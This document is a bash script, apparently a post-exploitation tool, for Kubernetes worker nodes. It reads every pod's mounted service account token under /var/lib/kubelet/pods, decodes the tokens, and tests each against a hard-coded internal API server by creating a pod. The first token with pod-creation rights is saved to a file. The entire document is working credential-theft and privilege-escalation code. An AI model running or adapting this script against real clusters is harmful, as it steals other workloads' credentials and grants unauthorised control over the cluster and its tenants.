#!/bin/bash

# Simple script to extract service account tokens from pods running on this worker node
# and test which ones can create pods

API_SERVER="https://172.23.24.76:6443"

echo "Service Account Token Hunter"
echo "Running on worker node: $(hostname)"
echo "Scanning for privileged service account tokens..."
echo ""

# Clear any existing token.txt
> token.txt

# Function to test if a token can create pods
test_pod_creation() {
    local token="$1"
    local namespace="$2"
    
    local response=$(curl -sSk -w "%{http_code}" \
        --header "Authorization: Bearer $token" \
        --header "Content-Type: application/json" \
        --request POST \
        "$API_SERVER/api/v1/namespaces/$namespace/pods" \
        --data '{
            "kind": "Pod",
            "apiVersion": "v1",
            "metadata": {"name": "test-pod"},
            "spec": {
                "containers": [{"name": "test", "image": "busybox", "command": ["sleep", "5"]}]
            }
        }' 2>/dev/null)
    
    local http_code=$(echo "$response" | tail -c 4)
    
    # 201 = Created, 409 = Already exists (both mean we have permission)
    # 403 = Forbidden, 401 = Unauthorized
    if [[ "$http_code" == "201" || "$http_code" == "409" ]]; then
        return 0  # Can create pods
    else
        return 1  # Cannot create pods
    fi
}

# Check if we're running with proper permissions
if [[ ! -d "/var/lib/kubelet/pods" ]]; then
    echo "✗ Cannot access /var/lib/kubelet/pods - are you on a worker node?"
    exit 1
fi

if [[ $EUID -ne 0 ]]; then
    echo "Warning: Not running as root - some token files may be inaccessible"
    echo "Try: sudo $0"
    echo ""
fi

echo "Scanning kubelet pod directories..."
echo ""

# Scan all pod directories
for pod_dir in /var/lib/kubelet/pods/*/; do
    if [[ ! -d "$pod_dir" ]]; then
        continue
    fi
    
    pod_uid=$(basename "$pod_dir")
    echo "Checking pod: $pod_uid"
    
    # Find service account token (modern Kubernetes uses projected volumes)
    token_file=$(find "$pod_dir" -path "*/kubernetes.io~projected/*/token" -type f 2>/dev/null | head -1)
    
    # Fallback to old-style token location
    if [[ -z "$token_file" ]]; then
        token_file=$(find "$pod_dir" -name "token" -type f 2>/dev/null | head -1)
    fi
    
    if [[ -z "$token_file" ]]; then
        echo "  ✗ No token file found"
        continue
    fi
    
    # Extract token
    token=$(cat "$token_file" 2>/dev/null)
    if [[ -z "$token" ]]; then
        echo "  ✗ Token file empty or unreadable"
        continue
    fi
    
    echo "  ✓ Token found"
    
    # Try to get namespace from the projected volume directory first
    namespace_file=$(dirname "$token_file")/namespace
    if [[ -f "$namespace_file" ]]; then
        namespace=$(cat "$namespace_file" 2>/dev/null)
    else
        namespace="default"
    fi
    
    # Decode token to get metadata
    payload=$(echo "$token" | cut -d. -f2 | base64 -d 2>/dev/null)
    if [[ $? -eq 0 ]]; then
        # Extract pod info from token
        token_namespace=$(echo "$payload" | jq -r '.kubernetes.io.namespace // "unknown"' 2>/dev/null)
        pod_name=$(echo "$payload" | jq -r '.kubernetes.io.pod.name // "unknown"' 2>/dev/null)
        service_account=$(echo "$payload" | jq -r '.kubernetes.io.serviceaccount.name // "unknown"' 2>/dev/null)
        
        # Use token namespace if available, otherwise use file namespace
        if [[ "$token_namespace" != "unknown" && "$token_namespace" != "null" && -n "$token_namespace" ]]; then
            namespace="$token_namespace"
        fi
    else
        pod_name="unknown"
        service_account="unknown"
    fi
    
    # Test pod creation privilege
    echo -n "  Testing pod creation... "
    if test_pod_creation "$token" "$namespace"; then
        echo "✓ CAN CREATE PODS!"
        echo ""
        echo "  SUCCESS: Privileged token found!"
        echo "  Service Account: $service_account"
        echo "  Namespace: $namespace"
        echo "  Saving token to token.txt..."
        
        # Save the privileged token to token.txt
        echo "$token" > token.txt
        
        echo "  ✓ Token saved to token.txt"
        echo ""
        exit 0  # Exit after finding the first privileged token
    else
        echo "✗ Cannot create pods"
    fi
    
    echo ""
done

echo "✗ No privileged tokens found on this worker node"
